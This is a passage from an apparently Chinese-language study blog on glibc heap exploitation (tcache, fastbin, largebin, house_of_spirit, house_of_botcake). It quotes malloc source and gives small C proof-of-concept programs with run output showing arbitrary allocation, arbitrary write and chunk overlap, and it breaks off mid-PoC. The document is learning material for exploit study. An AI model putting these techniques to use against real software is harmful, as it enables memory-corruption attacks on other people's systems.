<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_dup_consolidate</span><br><span class="line">this <span class="built_in">printf</span> will establish the write buffer</span><br><span class="line">A:<span class="number">0x563058c578e0</span></span><br><span class="line">B:<span class="number">0x563058c578e0</span></span><br><span class="line">C:<span class="number">0x563058c578e0</span></span><br></pre></td></tr></table></figure>



<p>特点是不需要<code>calloc</code></p>
<h4 id="reverse-into-tcache"><a href="#reverse-into-tcache" class="headerlink" title="reverse_into_tcache"></a>reverse_into_tcache</h4><p>如果<code>fastbin</code>中有多于一个堆块,<code>tcache</code>空</p>
<p>那么从该<code>fastbin</code>中拿一个堆块时,首先会把<code>tcache</code>填满,然后再从<code>tcache</code>中拿出一个堆块来</p>
<p>并且<code>fastbin</code>和<code>tcache</code>都是链栈结构</p>
<p>这会导致<code>fastbin</code>中的堆块连接顺序反过来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbins[idx]-&gt;1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7</span><br><span class="line"></span><br><span class="line">tcachebins[idx]-&gt;7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *fastbin_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">int</span> usable_size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="type">int</span> chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk,<span class="number">0x3c</span>,<span class="keyword">sizeof</span>(fake_chunk));</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        fastbin_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(fastbin_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    *fastbin_chunks[<span class="number">0</span>] = ((<span class="type">size_t</span>)fastbin_chunks[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) ^ ((<span class="type">size_t</span>)&amp;fake_chunk);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);     <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(usable_size);            <span class="comment">//reverse fastbin into tcache</span></span><br><span class="line">    victim = <span class="built_in">malloc</span>(usable_size);   <span class="comment">//get stack address</span></span><br><span class="line">    assert(victim == (<span class="type">size_t</span>*)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_reverse_into_tcache</span><br></pre></td></tr></table></figure>

<h4 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house_of_mind"></a>house_of_mind</h4><p>不会</p>
<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h4><p>任意堆块释放进入<code>fastbin</code></p>
<p>构造假堆块时需要注意物理上相邻的下一个堆块的<code>prev_size</code>字段</p>
<p>这里有一个检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= CHUNK_HDR_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过检查的条件是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.nextchunk.prev_size &gt; chunk_hdr_sz (0x10)</span><br><span class="line">2.nextchunk.prev_size &lt; av-&gt;system_mem (整个堆区的大小,可能是0x21000)</span><br></pre></td></tr></table></figure>

<p>不需要和<code>fake_chunk.size</code>设置相同,只需要满足上述两个条件即可</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">10</span>];</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//prev_size</span></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x40</span>;  <span class="comment">//size</span></span><br><span class="line">    fake_chunk[<span class="number">9</span>] = <span class="number">0x1145</span>;  <span class="comment">//绕过两个宽松的检查</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = (<span class="type">size_t</span> *)&amp;fake_chunk[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">free</span>(victim);       <span class="comment">//将堆栈上的假堆块释放进入fastbin</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;   </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">//清空tcache保证下一次从fastbin中拿</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x30</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim: %p\n&quot;</span>, victim); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    assert(target == victim);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_spirit.c -o house_of_spirit -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_spirit</span><br><span class="line">victim: 0x7ffe53fab090</span><br><span class="line">target: 0x7ffe53fab090</span><br></pre></td></tr></table></figure>



<h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><h4 id="任意合法地址写堆块地址"><a href="#任意合法地址写堆块地址" class="headerlink" title="任意合法地址写堆块地址"></a>任意合法地址写堆块地址</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241101205326333.png" alt="image-20241101205326333"></p>
<p>1.首先将<code>0x431</code> 释放进入<code>largebin</code></p>
<p>2.假设此时我们有一个<code>UAF</code> ,修改<code>0x431</code>从堆块的<code>bk_nextsize</code>指针指向目标地址</p>
<p>3.将释放<code>0x421</code>释放进入<code>largebin</code>,此时由于<code>0x421</code>是该<code>bin</code>中最小的,因此<code>0x421</code>放入<code>largebin</code>中不会有任何检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">               &#125;</span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>其效果就是<code>target-&gt;fd_nextsize = &amp;chunk_0x421</code></p>
<p><code>0x431</code>的<code>fd_nextsize</code>还是错误地指向自己,这是因为修改该指针的<strong>机会</strong>被用于修改<code>target</code>的<code>fd_nextsize</code>了</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//use struct to align automatically</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> fd;</span><br><span class="line">    <span class="type">size_t</span> bk;</span><br><span class="line">    <span class="type">size_t</span> fd_nextsize;</span><br><span class="line">    <span class="type">size_t</span> bk_nextsize;</span><br><span class="line">&#125;Target;</span><br><span class="line"></span><br><span class="line">Target target=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = <span class="number">0</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span>,</span><br><span class="line">    .fd_nextsize = <span class="number">0</span>,</span><br><span class="line">    .bk_nextsize = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size: %p\n&quot;</span>, target.prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %p\n&quot;</span>, target.size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd: %p\n&quot;</span>, target.fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk: %p\n&quot;</span>, target.bk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd_nextsize: %p\n&quot;</span>, target.fd_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bk_nextsize: %p\n&quot;</span>, target.bk_nextsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *gap1;</span><br><span class="line">    <span class="type">size_t</span> *gap2;</span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    gap1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    gap2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(A);        <span class="comment">//A first put into unsortedbin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//a larger malloc request cause A then put into largebin</span></span><br><span class="line">    <span class="built_in">free</span>(B);        <span class="comment">//B first put into unsortedbin</span></span><br><span class="line"></span><br><span class="line">    A[<span class="number">3</span>] = &amp;target;</span><br><span class="line">    print_target();</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x430</span>);  <span class="comment">//put B into the same largebin as A</span></span><br><span class="line">    print_target();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc largebin_attack.c -o largebin_attack -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./largebin_attack</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: (nil)</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br><span class="line">----------------------------------------------</span><br><span class="line">prev_size: (nil)</span><br><span class="line">size: (nil)</span><br><span class="line">fd: (nil)</span><br><span class="line">bk: (nil)</span><br><span class="line">fd_nextsize: 0x55ea6d16f6e0</span><br><span class="line">bk_nextsize: (nil)</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure>

<p>同理可以将堆块地址写到堆栈上</p>
<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><h4 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h4><p>当释放的堆块没有被<code>tcache</code>接受(通常因为<code>tcache</code>满了),也没有被<code>fastbin</code>接受(通常比<code>fastbin</code>管辖范围大),</p>
<p>此时尝试对堆块尝试<strong>向前合并向后合并</strong></p>
<p>如果向后临近<code>topchunk</code>则直接还给<code>topchunk</code></p>
<p>如果向后不临近<code>topchunk</code>,则会放到<code>unsortedbin</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);</span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>假设有两个堆块<code>a</code>和<code>b</code>在物理上相邻,<code>a</code>在低处,<code>b</code>在高处</p>
<p>先释放<code>b</code>进入<code>unsortedbin</code>,然后释放<code>a</code>,</p>
<p>此时<code>a</code>会向前合并到<code>b</code></p>
<p>此时让<code>tcachebin</code>腾个空,<code>Double Free a</code>,让<code>a</code>进入<code>tcachebins</code></p>
<blockquote>
<p>为什么要让<code>tcachebin</code>腾空呢?直接<code>free</code>放到<code>bins</code>中不行吗?</p>
<p>还真不行,因为第一次<code>free(a)</code>进入<code>unsortedbin</code>时,会让<code>a-&gt;nextchunk-&gt;prev_in_use</code>置零,</p>
<p>下一次如果<code>free(a)</code>还是进入<code>unsortedbin</code>中时,会检查到<code>a-&gt;nextchunk-&gt;prev_in_use=0</code>,检查出了二次释放</p>
<p>而<code>tcachebins</code>只会有一个<code>key</code>值判重检查,显然释放进入<code>bins</code>中的堆块不会设置<code>key</code>值,能够通过这个检查</p>
</blockquote>
<p>那么此时就形成了堆块重叠</p>
<p><code>a</code>成为<code>b</code>腹中的一部分</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//b&#x27;s address is higher than a&#x27;s</span></span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//prevent consolidation with topchunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//free b into unsortedbins</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//a will consolidate 